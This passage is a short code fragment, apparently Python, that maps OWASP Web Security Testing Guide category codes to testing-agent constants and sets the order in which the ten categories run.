    'athn': ATHN_AGENT,
    'athz': ATHZ_AGENT,
    'sess': SESS_AGENT,
    'inpv': INPV_AGENT,
    'cryp': CRYP_AGENT,
    'clnt': CLNT_AGENT,
    'apit': APIT_AGENT,
}

WSTG_ORDER = ['info', 'conf', 'idnt', 'athn', 'athz',
               'sess', 'inpv', 'cryp', 'clnt', 'apit']
